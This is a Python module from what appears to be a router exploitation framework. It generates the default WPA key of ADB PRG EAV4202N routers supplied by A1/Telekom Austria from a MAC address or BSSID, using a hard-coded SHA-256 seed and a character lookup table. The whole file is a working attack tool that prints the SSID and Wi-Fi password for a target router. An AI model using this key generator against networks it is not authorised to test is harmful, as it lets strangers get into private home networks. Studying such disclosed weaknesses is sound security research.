# Name:A1/Telekom Austria PRG EAV4202N Default WPA Key Algorithm Weakness
# File:a1_default_wpa_key.py
# Author:Ján Trenčanský
# License: GNU GPL v3
# Created: 17.2.2014
# Last modified: 17.2.2014
# Shodan Dork:
# Description: Generates WPA key for ADB PRG EAV4202N used by A1/Telekom in Austria
# Based on work of Stefan Viehboeck
# https://sviehb.wordpress.com/2011/12/04/prg-eav4202n-default-wpa-key-algorithm/

import core.Misc
import core.io
from interface.utils import validate_mac, lookup_mac
from interface.messages import print_success, print_error, print_help, print_info

import re
import hashlib


class Misc(core.Misc.RextMisc):
    """
Name:A1/Telekom Austria PRG EAV4202N Default WPA Key Algorithm Weakness
File:a1_default_wpa_key.py
Author:Ján Trenčanský
License: GNU GPL v3
Created: 17.2.2014
Description: Generates WPA key for ADB PRG EAV4202N used by A1/Telekom in Austria
Based on: Work of Stefan Viehboeck https://sviehb.wordpress.com/2011/12/04/prg-eav4202n-default-wpa-key-algorithm/

Options:
    Name        Description

    mac         MAC address used as input for password generation
    """
    mac = "00:00:00:00:00"

    def __init__(self):
        core.Misc.RextMisc.__init__(self)

    def do_set(self, e):
        args = e.split(' ')
        if args[0] == "mac":
            if validate_mac(args[1]):
                self.mac = args[1]
                print_info("MAC set to: " + self.mac + " " + lookup_mac(self.mac))
            else:
                print_error("provide valid MAC address")

    def do_mac(self, e):
        print_info(self.mac)

    def help_set(self):
        print_help("Set value of variable: \"set mac 00:11:22:33:44:55\"")

    def help_mac(self):
        print_help("Prints value of variable MAC")

    def do_run(self, e):
        mac_str = re.sub(r'[^a-fA-F0-9]', '', self.mac)
        bytemac = bytearray.fromhex(mac_str)
        print_success("Key generated")
        print('based on rg_mac:\nSSID: PBS-%02X%02X%02X' % (bytemac[3], bytemac[4], bytemac[5]))
        print('WPA key: %s\n' % (self.gen_key(bytemac)))

        bytemac[5] -= 5
        print('based on BSSID:\nSSID: PBS-%02X%02X%02X' % (bytemac[3], bytemac[4], bytemac[5]))
        print('WPA key: %s\n' % (self.gen_key(bytemac)))

    #This part is work of Stefan Viehboeck (ported to py3)
    def gen_key(self, mac):
        seed = (b'\x54\x45\x4F\x74\x65\x6C\xB6\xD9\x86\x96\x8D\x34\x45\xD2\x3B\x15' +
                b'\xCA\xAF\x12\x84\x02\xAC\x56\x00\x05\xCE\x20\x75\x94\x3F\xDC\xE8')
        lookup = '0123456789ABCDEFGHIKJLMNOPQRSTUVWXYZabcdefghikjlmnopqrstuvwxyz'

        h = hashlib.sha256()
        h.update(seed)
        h.update(mac)
        digest = bytearray(h.digest())
        return ''.join([lookup[x % len(lookup)] for x in digest[0:13]])
Misc()